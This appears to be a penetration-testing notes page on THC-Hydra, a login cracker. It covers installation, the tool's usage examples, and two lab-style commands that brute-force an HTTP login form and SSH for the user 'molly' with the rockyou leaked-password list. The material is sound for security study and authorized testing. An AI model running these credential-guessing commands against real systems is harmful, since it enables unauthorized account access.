# Hydra

## About

[THC-Hydra](https://github.com/vanhauser-thc/thc-hydra) is parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely. It supports: Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP

## Installing

```
sudo git clone https://github.com/vanhauser-thc/thc-hydra.git && cd thc-hydra
sudo ./configure
sudo make
sudo make install
```

## Usage

```
Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

`hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

![](<../../.gitbook/assets/image (90).png>)

`hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 -t 4 ssh`

![](<../../.gitbook/assets/image (73).png>)
